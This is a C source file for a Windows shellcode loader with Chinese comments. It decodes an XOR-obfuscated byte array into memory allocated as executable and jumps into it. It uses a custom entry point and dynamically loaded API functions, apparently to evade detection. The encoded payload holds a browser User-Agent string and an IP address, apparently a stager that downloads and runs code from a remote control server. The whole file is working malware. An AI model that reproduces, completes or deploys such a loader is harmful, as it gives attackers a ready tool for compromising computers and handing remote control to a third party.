#include "header.h"
#include "api.h"

#pragma comment(linker, "/entry:RainMain")
#pragma comment(linker, "/MERGE:.rdata=.data")

// 主函数
int RainMain()
{

    // 指针结构体，加载动态函数
    FUNCTIONS fn;
    InitModule(&fn);

	unsigned char baicai[] = "\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\xdf\x2f\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x4a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x5b\x3c\x78\x69\x0a\x2a\x2a\xba\x9a\x8c\xae\xa1\x98\xf6\x7a\x94\x05\x53\x13\xdd\x2c\x47\x43\x49\xd1\x30\x0c\xd4\xe0\xa0\x7a\x58\x95\xd8\x29\xdd\x7f\x31\x19\x63\x5a\x0e\xa8\xfa\x3b\x91\xb5\x25\xa5\x72\x9f\x86\x8a\x99\x38\xaf\x25\x8c\x89\xb3\x3e\xa9\xac\xbf\xc7\x6a\x8c\x3f\x31\xe8\x71\xe4\xb9\xab\x7c\x22\xe0\x1f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5d\x45\x5d\x3c\x3e\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x44\x5a\x3a\x38\x23\x07\x00\x0a\xf9\xd5\x18\x80\xae\x48\xc9\xc3\xfe\x10\x43\x0e\xc4\x3c\xbc\x0b\x7d\xf9\xfc\xbb\xbe\x41\x7a\xf4\xb7\xe7\x0f\x92\x44\x52\x97\xaf\xc9\xdf\x9b\xd2\x60\x0d\xe3\x28\xa9\x29\x81\x3a\x11\x6e\xd1\xeb\xbe\xb6\xe4\xee\xac\x05\xf7\xa1\xb8\x4f\x56\x72\x35\x98\x4b\x2b\x5c\x36\x28\x86\x87\x62\x56\xa6\x1b\x3a\xf6\x71\x8f\x31\x5f\x96\x91\x86\x17\xc3\x70\x70\xe1\x52\x3b\xe3\xbd\x90\xe3\x6d\x28\x83\x6b\x9f\x68\xb3\x94\x45\x7e\x81\x26\x86\xb0\xf3\x09\xb3\xb0\x32\xe5\x67\x48\x83\xb6\xf8\x05\x4d\xfa\xd3\x62\x2f\x92\x7c\x39\xa4\xf6\x39\x22\xc7\x17\xcd\xec\x3e\xe4\x05\x60\xc1\xd2\x2b\x8a\xe2\xa2\x38\x7a\x97\xd3\xc3\x1f\x62\x3e\x69\x99\x8d\x14\x31\x35\x64\x15\x6f\x1e\x00\xe1\xfb\x6b\xbc\xc5\x68\x55\xc5\x7b\x59\x86\x34\x31\xaa\x43\x94\xd2\x7e\xd2\x00\x34\xe7\xef\x5e\x9b\xb5\x20\x8b\x75\x29\x4c\xb9\x2a\xac\x63\xd1\xf0\x5a\xb0\xae\xc5\x63\x66\x26\xf2\x2f\x65\x76\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x3f\x3e\x24\x38\x38\x24\x3b\x3b\x3d\x24\x39\x3b\x0a\x43\x9c\x08\xd8\x04\x0b\x0b\x0d\x04\x09\x0b\x0a\x03\x0c\x08\x08";

    // 申请内存空间，强转为char*型赋值给VR char指针型空间，后面xor解密直接复制到空间中
    unsigned char* VR = (unsigned char*)fn.fnVirtualAlloc(NULL, sizeof(baicai), MEM_COMMIT, PAGE_EXECUTE_READWRITE);


    // xor解密赋值到空间中
    for (size_t i = 0; i<sizeof(baicai); i++)
    {
        VR[i] = baicai[i] ^ 10;
    }

    __asm
    {
        mov eax, VR
        call eax;
    }
    fn.fnVirtualFree(VR, sizeof(baicai), MEM_RELEASE);


	return 0;
}
